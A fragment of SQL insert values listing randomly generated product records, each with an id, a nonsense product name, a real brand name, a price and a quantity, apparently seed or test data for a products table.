(8203,'Fantastic Soft Towels','3M','621896.00',244),
(5656,'Rustic Concrete Keyboard','Nike','916175.00',400),
(4988,'Licensed Fresh Chair','Pepsodent','781705.00',138),
(7701,'Handcrafted Metal Tuna','Adidas','511814.00',841),
(2727,'Ergonomic Rubber Bike','IBM','997020.00',809),
(8355,'Oriental Frozen Ball','Tesla','982021.00',977),
(1724,'Elegant Metal Fish','Sharp','961685.00',471),
(1476,'Oriental Rubber Car','FedEx','497905.00',307),
(5612,'Luxurious Frozen Bacon','Gucci','999043.00',503),
(1264,'Awesome Soft Car','Sharp','750624.00',814),
(2470,'Refined Cotton Tuna','Logitech','436384.00',155),
(9651,'Oriental Plastic Mouse','Sharp','605096.00',132),
(1387,'Small Granite Chicken','IBM','968143.00',632),
(2117,'Rustic Soft Computer','Disney','561873.00',788),
(4356,'Handmade Rubber Keyboard','HBO','808470.00',225),
(7100,'Luxurious Steel Chips','Motorola','837624.00',912),
(5302,'Electronic Plastic Bike','Porsche','708466.00',560),
(4585,'Sleek Plastic Hat','Amazon','510466.00',157),
(6939,'Unbranded Concrete Shirt','Suzuki','939745.00',962),
(3142,'Sleek Steel Car','Toshiba','785892.00',504),
(6393,'Intelligent Rubber Keyboard','Tesla','723448.00',287),
(4225,'Elegant Fresh Gloves','Chanel','154009.00',756),
(5751,'Rustic Granite Bacon','Apple','304683.00',200),
(7101,'Handcrafted Soft Fish','Acer','605697.00',331),
(8984,'Refined Soft Pants','Nike','701583.00',504),
(4947,'Intelligent Cotton Chair','Disney','513512.00',774),
(2363,'Small Rubber Ball','Aisan','181408.00',913),
(5912,'Rustic Frozen Shirt','Mitsubishi','366300.00',830),
(8147,'Gorgeous Plastic Chips','Acer','25183.00',776),
(1371,'Oriental Fresh Hat','Philips','369433.00',145),
(7500,'Generic Soft Table','Adidas','374376.00',277),
(8065,'Tasty Cotton Bacon','Apple','721843.00',578),
(3192,'Incredible Concrete Computer','Ferarri','619408.00',711),
(5149,'Fantastic Cotton Pizza','Mercedes','560586.00',837),
(9171,'Gorgeous Bronze Bike','Asus','731145.00',777),
(8293,'Rustic Granite Chair','Uber','760044.00',659),
(1314,'Unbranded Plastic Fish','Unilever','958386.00',929),
(1531,'Licensed Steel Chips','Nvidia','77563.00',883),
(6302,'Unbranded Frozen Bacon','Robot','20732.00',809),
(9019,'Incredible Cotton Chair','Suzuki','338049.00',281),
(9357,'Licensed Cotton Keyboard','Disney','465059.00',762),
(4489,'Rustic Fresh Tuna','Huawei','850375.00',368),
(4963,'Practical Fresh Keyboard','Chanel','698571.00',558),
(5327,'Awesome Plastic Chair','Audi','698119.00',174),
(8032,'Electronic Plastic Fish','FedEx','423084.00',504),
(1653,'Sleek Metal Bacon','Disney','116654.00',957),
(2613,'Modern Steel Bike','FedEx','482987.00',291),
(1448,'Luxurious Bronze Tuna','Porsche','861516.00',590),
(5101,'Practical Fresh Pizza','Aisan','734566.00',783),
(3130,'Intelligent Fresh Gloves','Uber','845970.00',690),
(4912,'Unbranded Bronze Sausages','Yamaha','632807.00',108),
(4770,'Incredible Plastic Bike','Vans','836009.00',208),
(3997,'Fantastic Steel Tuna','Porsche','170466.00',449),
(6164,'Handcrafted Rubber Mouse','Motorola','430642.00',318),
(7311,'Oriental Metal Shoes','Unilever','79366.00',209),
(2204,'Elegant Cotton Pants','AMD','682881.00',564),
(9664,'Elegant Wooden Table','Amazon','652147.00',840),
(2919,'Electronic Frozen Tuna','Rolex','698927.00',119),
(9446,'Fantastic Fresh Bike','Nike','708817.00',689),
(8631,'Modern Metal Hat','Kawasaki','303804.00',645),
(4647,'Electronic Soft Pizza','Philips','788920.00',717),
(3379,'Awesome Cotton Mouse','Adobe','494259.00',241),
(8518,'Electronic Wooden Soap','Asus','585394.00',699),
(3174,'Sleek Fresh Pants','Alienware','432372.00',137),
(2916,'Generic Rubber Salad','Lamborghini','884225.00',265),
(5418,'Bespoke Steel Hat','Xiaomi','208563.00',672),
(5498,'Practical Rubber Car','Pepsodent','433306.00',909),
(6314,'Ergonomic Concrete Chips','Porsche','262544.00',555),
(4950,'Rustic Fresh Cheese','Mercedes','685222.00',757),
(5470,'Intelligent Plastic Chicken','Amazon','863766.00',375),
(4403,'Tasty Fresh Chips','Rolex','242818.00',486),
(5079,'Intelligent Rubber Cheese','Acer','151304.00',647),
(9868,'Oriental Granite Towels','Nokia','653955.00',712),
(3237,'Small Wooden Cheese','Gucci','230677.00',547),
(5254,'Intelligent Fresh Tuna','Yamaha','158720.00',186),
(3744,'Luxurious Granite Bacon','Lenovo','203142.00',949),
(1163,'Refined Bronze Table','Lenovo','590035.00',427),
(5191,'Gorgeous Concrete Towels','Rolex','607014.00',173),
(2888,'Oriental Steel Soap','Kawasaki','627265.00',128),
(1689,'Licensed Plastic Table','Samsung','567011.00',811),
(6056,'Awesome Steel Shoes','Mercedes','691041.00',243),
(2862,'Practical Concrete Fish','Suzuki','893414.00',975),
(1944,'Refined Cotton Tuna','Lamborghini','956764.00',612),
(4191,'Small Soft Cheese','Adobe','641329.00',577),
(9334,'Luxurious Steel Shoes','Vans','511054.00',666),
(6005,'Licensed Soft Shoes','Huawei','111058.00',183),
(9907,'Awesome Bronze Shoes','Nvidia','276548.00',701),
(8445,'Rustic Wooden Computer','3M','532028.00',101),
(8010,'Ergonomic Plastic Soap','Mitsubishi','333460.00',101),
(6841,'Electronic Rubber Keyboard','Polytron','738683.00',200),
(6770,'Licensed Granite Soap','Alienware','370713.00',537),
(2046,'Recycled Granite Computer','Amazon','716832.00',278),
(2436,'Unbranded Wooden Chips','Asus','43179.00',682),
(6684,'Modern Bronze Table','Philips','504316.00',434),
(4797,'Licensed Concrete Hat','Kawasaki','946467.00',863),
(1444,'Unbranded Bronze Gloves','Chanel','782933.00',857),
(1136,'Bespoke Concrete Salad','Asus','964354.00',438),
(4114,'Practical Fresh Chair','Robot','998838.00',703),
(4602,'Licensed Cotton Salad','Unilever','249103.00',404),
(1599,'Awesome Concrete Mouse','Chanel','725499.00',777),
(3435,'Intelligent Fresh Chips','Sharp','467880.00',168),
(2898,'Recycled Cotton Car','Disney','133961.00',806),
(1158,'Tasty Bronze Pizza','Acer','167100.00',528),
(9363,'Rustic Rubber Pants','Vans','398055.00',315),
(7002,'Modern Steel Hat','Uber','97025.00',925),
(5605,'Small Soft Soap','Aisan','564701.00',306),
(3901,'Modern Steel Mouse','Mitsubishi','623315.00',344),
(5253,'Intelligent Metal Pants','IBM','599612.00',469),
(9385,'Elegant Fresh Towels','Robot','356756.00',305),
(8242,'Modern Metal Bacon','Porsche','126856.00',951),
(6677,'Unbranded Bronze Keyboard','Chanel','825050.00',575),
(6976,'Unbranded Plastic Table','Yamaha','993577.00',956),
(5250,'Luxurious Fresh Pants','Nvidia','673518.00',308),
(6241,'Gorgeous Rubber Fish','Microsoft','423555.00',384),
(7557,'Bespoke Metal Hat','Gucci','435431.00',223),
(4027,'Intelligent Soft Cheese','Intel','545767.00',928),
(8443,'Handmade Concrete Soap','Uber','408963.00',880),
(2017,'Handmade Cotton Mouse','Vans','705563.00',595),
(3728,'Licensed Rubber Soap','Mercedes','53626.00',719),
(7626,'Handmade Cotton Fish','Lamborghini','526700.00',571),
(9172,'Awesome Fresh Tuna','Lenovo','134848.00',646),
(3596,'Small Concrete Car','Uber','15532.00',119),
(5724,'Handmade Fresh Pizza','Rolex','133465.00',249),
(5018,'Bespoke Cotton Ball','Porsche','467948.00',388),
(6853,'Tasty Cotton Car','Nvidia','962653.00',568),
(3013,'Practical Frozen Cheese','Sony','538680.00',279),
(8906,'Rustic Steel Gloves','Logitech','971482.00',282),
(8861,'Small Concrete Gloves','Nintendo','900780.00',954),
(6696,'Small Metal Car','Disney','397312.00',186),
(2733,'Generic Frozen Towels','Logitech','263686.00',842),
(6472,'Rustic Cotton Gloves','Nokia','829448.00',705),
(1771,'Generic Frozen Bacon','Uber','681009.00',245),
(7397,'Refined Wooden Towels','Ferarri','423994.00',272),
(2339,'Generic Steel Bike','Samsung','296831.00',903),
(3242,'Sleek Cotton Towels','HTC','341887.00',499),
(5970,'Unbranded Concrete Cheese','Porsche','911241.00',723),
(4873,'Awesome Frozen Fish','HBO','297876.00',455),
(9406,'Awesome Soft Table','Uber','883916.00',299),
(8552,'Sleek Cotton Shoes','Disney','724489.00',950),
(3164,'Tasty Wooden Chips','Asus','848292.00',881),
(5919,'Elegant Concrete Table','Mercedes','419643.00',428),
(3937,'Refined Soft Soap','Robot','747254.00',922),
(7499,'Sleek Steel Gloves','Toyota','664381.00',818),
(7276,'Unbranded Fresh Cheese','3M','931908.00',166),
(6419,'Unbranded Rubber Shoes','Mercedes','20795.00',846),
(3732,'Gorgeous Metal Pizza','Tesla','644075.00',638),
(7312,'Licensed Frozen Bike','Microsoft','841707.00',745),
(5208,'Oriental Steel Bike','Vans','159172.00',179),
(4971,'Gorgeous Soft Bike','Robot','956730.00',553),
(6777,'Ergonomic Steel Car','Uniqlo','119053.00',125),
(5907,'Luxurious Bronze Computer','Amazon','348445.00',577),
(8200,'Small Fresh Keyboard','Chanel','14597.00',832),
(7482,'Handcrafted Soft Computer','Vans','52987.00',883),
(9911,'Incredible Cotton Computer','Asus','799868.00',994),
(6447,'Recycled Concrete Shirt','Intel','43100.00',722),
(8770,'Rustic Bronze Ball','Adidas','216322.00',184),
(9153,'Elegant Bronze Chair','Lenovo','999744.00',931),
(6153,'Handcrafted Granite Keyboard','Disney','708694.00',584),
(4303,'Licensed Cotton Hat','Nintendo','189001.00',135),
(3810,'Gorgeous Concrete Gloves','Motorola','589770.00',601),
(6595,'Recycled Fresh Computer','Tesla','96327.00',540),
(7191,'Small Frozen Shoes','Unilever','841779.00',168),
(6943,'Gorgeous Rubber Bike','Xiaomi','931878.00',369),
(5874,'Recycled Wooden Soap','Toyota','860330.00',246),
(8018,'Fantastic Steel Tuna','Uniqlo','454467.00',374),
(3687,'Bespoke Rubber Table','Kawasaki','510050.00',275),
(8805,'Practical Metal Salad','Chanel','672327.00',644),
(5085,'Awesome Steel Tuna','Adidas','223375.00',930),
(6658,'Electronic Rubber Shoes','Adobe','24053.00',779),
(2257,'Unbranded Wooden Pants','Mitsubishi','697674.00',495),
(7941,'Small Frozen Shoes','AMD','118097.00',604),
(4870,'Unbranded Bronze Chips','Toyota','117393.00',993),
(1602,'Intelligent Wooden Chair','Apple','780424.00',114),
(8276,'Generic Soft Fish','Mitsubishi','472845.00',927),
(1559,'Fantastic Soft Table','AMD','622291.00',857),
(8042,'Incredible Wooden Cheese','Samsung','313106.00',506),
(9200,'Handmade Steel Computer','IBM','656760.00',921),
(9118,'Modern Fresh Hat','IBM','863097.00',450),
(5055,'Bespoke Steel Hat','Rolex','70965.00',244),
(5370,'Bespoke Cotton Chair','Lamborghini','745735.00',635),
(2596,'Licensed Fresh Mouse','Vans','438433.00',640),
(2664,'Recycled Soft Chicken','Adidas','920788.00',687),
(3065,'Sleek Plastic Pants','Yamaha','764747.00',564),
(7015,'Practical Frozen Ball','ZTE','240252.00',996),
(2209,'Sleek Soft Chair','Adobe','12598.00',518),
(8959,'Luxurious Concrete Computer','Polytron','860782.00',390),
(3183,'Awesome Rubber Bacon','Polytron','762964.00',380),
(9485,'Tasty Steel Towels','Pepsodent','164816.00',231),
(9255,'Luxurious Frozen Soap','HBO','42063.00',829),
(8368,'Fantastic Bronze Hat','Sony','485075.00',770),
(8166,'Incredible Plastic Cheese','Vans','281657.00',812),
(6591,'Rustic Frozen Shoes','Uniqlo','504528.00',319),
(7954,'Sleek Metal Towels','Vans','787692.00',320),
(1360,'Generic Granite Chicken','Nokia','648016.00',189),
(9555,'Awesome Cotton Fish','Crocs','497777.00',672),
(1165,'Luxurious Cotton Cheese','Toyota','324631.00',882),
(2336,'Small Soft Pants','Nintendo','42616.00',272),
(8002,'Gorgeous Metal Chair','Ferarri','921408.00',652),
(8331,'Recycled Concrete Tuna','HBO','944510.00',496),
(7821,'Oriental Fresh Fish','Crocs','262078.00',481),
(6961,'Intelligent Steel Salad','Nike','967749.00',619),
(9291,'Fantastic Wooden Gloves','IBM','338665.00',165),
(1691,'Incredible Rubber Tuna','Hyundai','569687.00',334),
(7982,'Sleek Concrete Pants','Adobe','190535.00',566),
(9064,'Modern Fresh Salad','Vans','249708.00',599),
(9608,'Luxurious Cotton Hat','Rolex','497435.00',911),
(8498,'Intelligent Steel Car','Lenovo','86462.00',535),
(6356,'Handmade Concrete Pants','Unilever','703135.00',750),
(4604,'Intelligent Bronze Gloves','Amazon','569150.00',759),
(3539,'Licensed Plastic Cheese','HTC','854986.00',535),
(8267,'Rustic Metal Salad','Hyundai','840657.00',286),
(5642,'Awesome Soft Towels','Xiaomi','933859.00',562),
(9126,'Fantastic Frozen Car','Aisan','264119.00',938),
(8205,'Fantastic Fresh Fish','Nike','879314.00',489),
(9578,'Intelligent Fresh Pants','Samsung','475284.00',201),
(5856,'Ergonomic Metal Chicken','Ferarri','129808.00',223),
(4982,'Bespoke Cotton Ball','Microsoft','703295.00',475),
(9233,'Oriental Metal Bacon','Mercedes','476287.00',565),
(6343,'Incredible Wooden Fish','Huawei','721596.00',576),
(4175,'Recycled Wooden Chair','Ferarri','934795.00',994),
(5066,'Intelligent Fresh Ball','Nike','260630.00',690),
(4278,'Intelligent Concrete Mouse','Pepsodent','896656.00',548),
(7998,'Bespoke Wooden Computer','Toshiba','272786.00',786),
(3031,'Handmade Plastic Chicken','Gucci','943370.00',491),
(1372,'Rustic Wooden Fish','Lenovo','794125.00',808),
(9774,'Tasty Steel Computer','Nokia','928631.00',358),
(3375,'Handmade Rubber Towels','Uber','775599.00',849),
(8667,'Ergonomic Metal Ball','Kawasaki','695378.00',421),
(7166,'Electronic Bronze Fish','Huawei','606216.00',275),
(1239,'Tasty Soft Shirt','Suzuki','778510.00',275),
(3069,'Small Fresh Cheese','HTC','519918.00',717),
(8560,'Elegant Fresh Computer','Nike','161824.00',861),
(8507,'Luxurious Fresh Bike','Uber','287557.00',507),
(5875,'Intelligent Metal Computer','IBM','968166.00',829),
(4699,'Electronic Frozen Tuna','Hyundai','799076.00',803),
(5305,'Handcrafted Plastic Chicken','Toyota','556861.00',884),
(8987,'Bespoke Wooden Table','Uber','752527.00',288),
(2299,'Luxurious Granite Keyboard','Nike','893909.00',351),
(4872,'Small Frozen Pizza','Acer','973788.00',757),
(7392,'Refined Cotton Cheese','Mitsubishi','800290.00',199),
(3090,'Sleek Steel Mouse','Motorola','984536.00',492),
(5046,'Small Fresh Salad','Rolex','409881.00',973),
(2194,'Modern Rubber Chicken','Disney','986427.00',951),
(1885,'Ergonomic Cotton Fish','FedEx','714767.00',424),
(7996,'Practical Cotton Soap','Toyota','752494.00',780),
(5296,'Unbranded Fresh Cheese','Rolex','865795.00',734),
(4578,'Generic Granite Tuna','Hyundai','786438.00',996),
(4437,'Sleek Cotton Shoes','IBM','880648.00',687),
(3607,'Sleek Rubber Computer','Acer','668807.00',587),
(2166,'Bespoke Frozen Car','Xiaomi','302702.00',439),
(1417,'Practical Metal Chicken','Acer','201438.00',709),
(7015,'Fantastic Steel Towels','HBO','663461.00',725),
(4656,'Refined Metal Computer','Robot','936141.00',401),
(2503,'Electronic Soft Keyboard','Adobe','224038.00',879),
(7346,'Practical Metal Computer','Vans','679708.00',445),
(6316,'Modern Fresh Tuna','Xiaomi','753994.00',804),
(6717,'Modern Plastic Chicken','Acer','871371.00',307),
(5885,'Fantastic Concrete Keyboard','Nike','201697.00',751),
(5317,'Practical Bronze Table','Huawei','311994.00',433),
(6646,'Oriental Plastic Shirt','Gucci','450389.00',738),
(3557,'Handmade Fresh Mouse','IBM','106143.00',732),
(1193,'Generic Bronze Ball','Alienware','656606.00',275),
(5593,'Handmade Cotton Pants','Mercedes','705752.00',175),
(9859,'Oriental Wooden Table','Toyota','752577.00',937),
(3638,'Tasty Wooden Tuna','Polytron','833119.00',853),
(8360,'Bespoke Rubber Fish','Hyundai','283945.00',649),
(7561,'Incredible Frozen Tuna','Crocs','442033.00',114),
(3933,'Handcrafted Metal Mouse','Samsung','468612.00',809),
(3489,'Refined Soft Cheese','Logitech','221542.00',776),
(8506,'Sleek Rubber Bike','Asus','585013.00',343),
(2466,'Gorgeous Rubber Cheese','Kawasaki','42994.00',254),
(9085,'Handcrafted Plastic Pants','Acer','984284.00',676),
(1901,'Practical Bronze Car','Asus','623100.00',502),
(9013,'Bespoke Concrete Ball','FedEx','284637.00',395),
(8410,'Incredible Granite Pizza','Audi','709753.00',177),
(3392,'Refined Plastic Cheese','Mitsubishi','310420.00',255),
(4573,'Unbranded Bronze Pants','Ferarri','86072.00',511),
(5315,'Generic Rubber Table','Yamaha','829971.00',118),
(9307,'Handmade Steel Gloves','HTC','961466.00',738),
(2747,'Rustic Fresh Bike','Porsche','390125.00',475),
(6089,'Refined Rubber Mouse','ZTE','114257.00',850),
(2258,'Modern Frozen Soap','Audi','921021.00',258),
(3625,'Gorgeous Metal Shirt','HBO','533801.00',296),
(2382,'Intelligent Rubber Cheese','Uber','461470.00',991),
(2500,'Ergonomic Steel Computer','Yamaha','978311.00',604),
(9287,'Intelligent Granite Cheese','Philips','447063.00',409),
(8682,'Tasty Wooden Mouse','Amazon','262715.00',562),
(1502,'Luxurious Soft Gloves','HBO','598311.00',633),
(4225,'Intelligent Cotton Cheese','Intel','176292.00',200),
(4544,'Sleek Frozen Gloves','Crocs','109334.00',223),
(8454,'Bespoke Concrete Tuna','Aisan','119028.00',600),
(4271,'Bespoke Metal Ball','Samsung','401337.00',171),
(4107,'Modern Bronze Shoes','Philips','795205.00',711),
(2480,'Awesome Rubber Hat','Crocs','864031.00',867),
(5641,'Tasty Bronze Keyboard','Motorola','10878.00',564),
(8710,'Oriental Rubber Mouse','Disney','948118.00',987),
(5286,'Gorgeous Soft Bacon','Suzuki','512349.00',690),
(3666,'Elegant Steel Hat','Motorola','258890.00',217),
(9855,'Ergonomic Wooden Ball','Philips','778939.00',734),
(5926,'Luxurious Concrete Keyboard','Xiaomi','180650.00',735),
(9697,'Awesome Frozen Shirt','Rolex','321869.00',394),
(9739,'Awesome Plastic Mouse','Logitech','963351.00',346),
(1888,'Awesome Bronze Shirt','Nvidia','664722.00',997),
(2716,'Fantastic Frozen Keyboard','Nokia','313479.00',341),
(1442,'Handcrafted Rubber Pants','Nvidia','630843.00',572),
(7561,'Unbranded Plastic Soap','Lenovo','84404.00',405),
(5882,'Ergonomic Granite Chicken','Uber','472925.00',470),
(5404,'Incredible Metal Hat','Huawei','744629.00',832),
(6274,'Electronic Soft Chips','Toshiba','362930.00',896),
(7976,'Luxurious Cotton Chicken','Huawei','411014.00',525),
(4869,'Fantastic Granite Chicken','Adidas','267576.00',110),
(7293,'Modern Fresh Chicken','Xiaomi','852511.00',939),
(9539,'Sleek Granite Shoes','Kawasaki','629952.00',556),
(9479,'Modern Steel Ball','Audi','173368.00',635),
(6717,'Incredible Soft Fish','Adobe','85093.00',844),
(3328,'Fantastic Granite Car','Ferarri','438584.00',454),
(1592,'Tasty Plastic Towels','Chanel','773573.00',591),
(3693,'Licensed Frozen Pizza','Lamborghini','634689.00',741),
(6871,'Gorgeous Metal Chips','Acer','980897.00',171),
(1925,'Refined Granite Soap','Crocs','575988.00',232),
(4206,'Handmade Concrete Sausages','3M','31330.00',856),
(2980,'Small Wooden Tuna','Uniqlo','538781.00',602),
(4668,'Gorgeous Soft Mouse','Philips','237361.00',630),
(1192,'Unbranded Bronze Table','Tesla','58879.00',481),
(7918,'Ergonomic Bronze Table','Huawei','502391.00',388),
(6746,'Bespoke Rubber Computer','Microsoft','591383.00',337),
(8509,'Fantastic Steel Cheese','HTC','879054.00',915),
(4420,'Ergonomic Soft Sausages','Amazon','413213.00',784),
(7418,'Handmade Frozen Keyboard','Hyundai','83504.00',801),
(3568,'Handmade Granite Bacon','Yamaha','720969.00',110),
(2870,'Licensed Plastic Shirt','Huawei','308597.00',657),
(6308,'Generic Granite Fish','Apple','452801.00',288),
(8252,'Elegant Plastic Chips','Motorola','555431.00',966),
(8371,'Incredible Fresh Computer','Suzuki','867035.00',186),
(9384,'Bespoke Fresh Tuna','Xiaomi','184203.00',837),
(8956,'Unbranded Steel Salad','Vans','707618.00',973),
(9895,'Sleek Fresh Chair','Chanel','763026.00',355),
(1168,'Licensed Wooden Shoes','Microsoft','281338.00',100),
(5507,'Practical Cotton Salad','Audi','660553.00',397),
(3097,'Elegant Fresh Fish','Apple','385920.00',499),
(7378,'Handcrafted Soft Mouse','Toshiba','442527.00',481),
(5171,'Intelligent Fresh Bike','Disney','18367.00',145),
(6267,'Handmade Metal Towels','Porsche','449875.00',219),
(1526,'Awesome Rubber Soap','Motorola','867843.00',932),
(8163,'Unbranded Rubber Gloves','IBM','190085.00',776),
(7429,'Electronic Plastic Hat','Sharp','984813.00',461),
(5660,'Refined Concrete Bacon','Nvidia','536590.00',741),
(1031,'Licensed Plastic Chair','Disney','757582.00',857),
(4265,'Bespoke Concrete Table','Aisan','744341.00',624),
(6974,'Intelligent Concrete Chips','3M','106090.00',370),
(4630,'Electronic Bronze Sausages','Philips','110247.00',526),
(3273,'Licensed Steel Mouse','IBM','203308.00',458),
(2526,'Small Bronze Shirt','ZTE','575115.00',600),
(1484,'Handcrafted Rubber Sausages','Mercedes','883649.00',225),
(3665,'Practical Cotton Table','Apple','957614.00',262),
(9562,'Electronic Fresh Cheese','Uniqlo','191043.00',732),
(8999,'Bespoke Concrete Car','Gucci','99429.00',730),
(2303,'Incredible Wooden Bacon','Huawei','592332.00',526),
(6160,'Small Steel Soap','Nvidia','924558.00',608),
(9512,'Gorgeous Rubber Table','Sony','637605.00',738),
(1123,'Unbranded Cotton Mouse','Porsche','109776.00',320),
(3573,'Rustic Soft Chips','Toshiba','511300.00',201),
(9709,'Generic Concrete Mouse','Acer','975276.00',364),
(1744,'Practical Rubber Fish','Uber','883640.00',818),
(8540,'Rustic Cotton Car','Acer','131604.00',894),
(2422,'Incredible Cotton Bike','IBM','595669.00',677),
(4348,'Bespoke Wooden Computer','Sharp','575452.00',718),
(4606,'Oriental Steel Bacon','Disney','593069.00',530),
(9981,'Sleek Granite Keyboard','Motorola','57648.00',348),
(7478,'Practical Metal Pants','Samsung','550293.00',760),
(9860,'Handmade Frozen Chicken','Microsoft','682351.00',828),
(9687,'Tasty Wooden Tuna','FedEx','896146.00',770),
(2679,'Awesome Metal Towels','HBO','668537.00',967),
(8723,'Licensed Granite Chicken','Nike','324010.00',532),
(5558,'Luxurious Concrete Table','Mitsubishi','708010.00',679),
(5371,'Handcrafted Bronze Computer','Vans','78660.00',129),
(6599,'Small Bronze Table','Huawei','54436.00',918),
(5910,'Incredible Metal Fish','Chanel','361770.00',762),
(4147,'Bespoke Fresh Gloves','AMD','838210.00',383),
(6907,'Luxurious Concrete Computer','FedEx','125242.00',241),
(1597,'Intelligent Frozen Pants','Lenovo','452246.00',112),
(9472,'Gorgeous Cotton Fish','Uber','189479.00',320),
(3518,'Gorgeous Concrete Cheese','Chanel','511992.00',802),
(6677,'Luxurious Wooden Keyboard','Xiaomi','167209.00',295),
(3465,'Sleek Rubber Bike','Gucci','612191.00',737),
(8907,'Unbranded Granite Table','Toyota','933839.00',114),
(6776,'Rustic Cotton Computer','Unilever','267803.00',896),
(2226,'Refined Soft Gloves','Lamborghini','604740.00',366),
(7516,'Gorgeous Rubber Chicken','Nike','69112.00',691),
(3934,'Small Fresh Sausages','Xiaomi','29631.00',873),
(6843,'Licensed Metal Towels','Nokia','532143.00',291),
(3441,'Refined Wooden Sausages','HBO','185001.00',217),
(3040,'Rustic Rubber Car','Pepsodent','214787.00',621),
(4268,'Oriental Rubber Table','Pepsodent','798454.00',900),
(2499,'Incredible Granite Shoes','Logitech','313041.00',569),
(6603,'Sleek Concrete Shoes','Xiaomi','610347.00',950),
(8446,'Gorgeous Plastic Cheese','Apple','523843.00',913),
(7361,'Awesome Plastic Chips','Polytron','494239.00',778),
(5397,'Fantastic Granite Shirt','Pepsodent','912340.00',312),
(8402,'Licensed Rubber Car','Crocs','424272.00',984),
(9274,'Ergonomic Bronze Sausages','Rolex','592899.00',318),
(6867,'Oriental Granite Towels','Chanel','317886.00',583),
(9016,'Fantastic Wooden Bike','Vans','78691.00',507),
(5858,'Refined Steel Salad','Toyota','772410.00',509),
(1771,'Sleek Granite Gloves','Huawei','20346.00',926),
(9713,'Gorgeous Plastic Table','3M','326118.00',300),
(9436,'Handmade Granite Soap','Samsung','399086.00',622),
(2050,'Ergonomic Plastic Bike','Polytron','578453.00',595),
(7951,'Recycled Metal Table','FedEx','182434.00',467),
(5793,'Recycled Rubber Gloves','Toyota','749701.00',241),
(8833,'Practical Rubber Pants','ZTE','75039.00',337),
(8093,'Modern Cotton Shoes','ZTE','659695.00',490),
(8935,'Small Metal Bacon','Intel','402606.00',392),
(1285,'Luxurious Granite Chicken','Sharp','977404.00',489),
(6085,'Small Fresh Sausages','Nvidia','415646.00',987),
(6261,'Electronic Soft Tuna','HTC','784251.00',387),
(9326,'Modern Wooden Pizza','Chanel','499393.00',445),
(7992,'Awesome Metal Chicken','IBM','820764.00',369),
(1561,'Licensed Bronze Towels','Vans','202858.00',514),
(1703,'Handcrafted Metal Bike','IBM','979989.00',762),
(9730,'Recycled Wooden Table','Apple','614171.00',243),
(6738,'Gorgeous Bronze Bike','ZTE','339480.00',429),
(5803,'Awesome Concrete Towels','Chanel','387387.00',131),
(1292,'Bespoke Rubber Fish','HTC','693086.00',252),
(4189,'Ergonomic Granite Ball','HTC','585116.00',704),
(7784,'Generic Fresh Soap','3M','92869.00',319),
(1361,'Awesome Metal Soap','Nintendo','853024.00',668),
(1189,'Handcrafted Frozen Pizza','Ferarri','516710.00',583),
(9681,'Tasty Plastic Cheese','FedEx','861908.00',387),
(7196,'Small Rubber Salad','Uber','866676.00',947),
(1913,'Incredible Steel Soap','Intel','69877.00',414),
(6045,'Awesome Fresh Bike','Microsoft','787717.00',291),
(1567,'Recycled Metal Bacon','Mercedes','428991.00',773),
(8958,'Licensed Concrete Chair','Toshiba','685113.00',747),
(7728,'Intelligent Concrete Table','Suzuki','307651.00',160),
(8223,'Practical Soft Fish','Yamaha','441804.00',649),
(9929,'Elegant Soft Keyboard','Lamborghini','538430.00',283),
(5218,'Bespoke Rubber Car','Nike','802761.00',283),
(4139,'Licensed Soft Bacon','Ferarri','908684.00',951),
(8824,'Oriental Bronze Car','Robot','174583.00',295),
(1017,'Luxurious Concrete Cheese','Mitsubishi','929619.00',951),
(9946,'Handmade Fresh Bacon','Sharp','515118.00',376),
(7309,'Elegant Rubber Table','Toshiba','526705.00',482),
(9494,'Generic Steel Salad','Rolex','57788.00',455),
(6026,'Handcrafted Cotton Bacon','Uber','797820.00',660),
(1777,'Modern Granite Chicken','Tesla','587244.00',856),
(7134,'Bespoke Fresh Sausages','Xiaomi','263003.00',715),
(5940,'Ergonomic Metal Fish','Toyota','970957.00',251),
(5205,'Intelligent Plastic Tuna','Tesla','543402.00',866),
(1901,'Handcrafted Metal Tuna','HBO','887025.00',603),
(7667,'Elegant Wooden Chips','Tesla','266080.00',321),
(9086,'Small Metal Towels','Nike','20491.00',735),
(7879,'Electronic Wooden Shirt','Xiaomi','529046.00',153),
(5479,'Ergonomic Wooden Bacon','Logitech','404838.00',911),
(7808,'Fantastic Plastic Cheese','Intel','697289.00',117),
(3981,'Modern Metal Bacon','Polytron','860549.00',720),
(5737,'Generic Wooden Pants','Lamborghini','819317.00',339),
(3668,'Rustic Frozen Pizza','Aisan','597078.00',268),
(8745,'Gorgeous Cotton Towels','Samsung','601768.00',412),
(4133,'Unbranded Cotton Salad','Toyota','189834.00',599),
(2202,'Luxurious Soft Bacon','Nvidia','498978.00',601),
(1855,'Incredible Plastic Table','Uber','429078.00',123),
(1306,'Tasty Rubber Towels','Huawei','906561.00',175),
(9791,'Gorgeous Cotton Fish','Robot','546399.00',853),
(3375,'Generic Metal Bike','Audi','801684.00',809),
(5135,'Gorgeous Rubber Bike','3M','208539.00',121),
(2917,'Elegant Steel Pizza','Mitsubishi','917213.00',922),
(7003,'Fantastic Cotton Soap','Sharp','321224.00',543),
(3719,'Rustic Steel Hat','Aisan','732367.00',672),
(5516,'Oriental Cotton Ball','Amazon','979889.00',319),
(1056,'Unbranded Steel Salad','Uber','16418.00',210),
(7074,'Licensed Granite Computer','Acer','226249.00',630),
(4923,'Handmade Metal Bacon','Robot','858956.00',694),
(9771,'Intelligent Metal Computer','Crocs','561220.00',579),
(6032,'Fantastic Rubber Bike','Alienware','414153.00',156),
(5156,'Sleek Metal Cheese','Alienware','388889.00',832),
(6828,'Oriental Soft Chicken','Sony','512272.00',394),
(1856,'Small Plastic Towels','Xiaomi','920049.00',740),
(6182,'Handcrafted Cotton Salad','Sony','457748.00',286),
(8815,'Awesome Cotton Fish','Amazon','226293.00',167),
(9232,'Unbranded Bronze Gloves','Nintendo','150550.00',847),
(7606,'Elegant Granite Shoes','Gucci','522007.00',790),
(2398,'Handcrafted Granite Soap','Gucci','795295.00',606),
(1862,'Elegant Concrete Mouse','Xiaomi','872505.00',323),
(9279,'Rustic Frozen Keyboard','Nvidia','483690.00',547),
(5970,'Tasty Wooden Fish','Xiaomi','271150.00',657),
(9073,'Intelligent Plastic Ball','Robot','333317.00',679),
(2352,'Oriental Plastic Bike','Nike','622963.00',803),
(2175,'Luxurious Frozen Shirt','Apple','292479.00',197),
(1291,'Licensed Concrete Hat','Polytron','313798.00',380),
(1136,'Handcrafted Soft Fish','Nintendo','49069.00',204),
(7530,'Handcrafted Rubber Chips','Pepsodent','682838.00',329),
(1222,'Awesome Soft Shirt','Lamborghini','945643.00',689),
(1502,'Electronic Steel Sausages','HTC','826747.00',386),
